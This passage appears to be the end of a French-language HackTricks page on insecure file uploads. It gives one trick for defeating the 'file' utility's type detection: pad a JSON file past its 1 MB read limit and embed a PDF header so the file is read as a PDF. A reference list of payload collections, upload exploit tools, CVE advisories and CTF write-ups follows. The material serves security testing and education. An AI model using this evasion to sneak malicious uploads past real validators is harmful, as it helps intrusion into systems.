- **`file` binary** : Il peut lire jusqu'à 1048576 octets d'un fichier. Il suffit de créer un JSON plus grand que cela pour qu'il ne puisse pas analyser le contenu comme JSON, puis insérer dans le JSON la partie initiale d'un vrai PDF et il le détectera comme PDF

## Références

- [When Audits Fail: Four Critical Pre-Auth Vulnerabilities in TRUfusion Enterprise](https://www.rcesecurity.com/2025/09/when-audits-fail-four-critical-pre-auth-vulnerabilities-in-trufusion-enterprise/)

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files)
- [https://github.com/modzero/mod0BurpUploadScanner](https://github.com/modzero/mod0BurpUploadScanner)
- [https://github.com/almandin/fuxploider](https://github.com/almandin/fuxploider)
- [https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)
- [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
- [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)
- [https://blog.doyensec.com/2025/01/09/cspt-file-upload.html](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)
- [usd HeroLab – Gibbon LMS arbitrary file write (CVE-2023-45878)](https://herolab.usd.de/security-advisories/usd-2023-0025/)
- [NVD – CVE-2023-45878](https://nvd.nist.gov/vuln/detail/CVE-2023-45878)
- [0xdf – HTB: TheFrizz](https://0xdf.gitlab.io/2025/08/23/htb-thefrizz.html)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)
- [CVE-2024-21546 – NVD entry](https://nvd.nist.gov/vuln/detail/CVE-2024-21546)
- [PoC gist for LFM .php. bypass](https://gist.github.com/ImHades101/338a06816ef97262ba632af9c78b78ca)
- [0xdf – HTB Environment (UniSharp LFM upload → PHP RCE)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [Microsoft – mklink (command reference)](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)

{{#include ../../banners/hacktricks-training.md}}
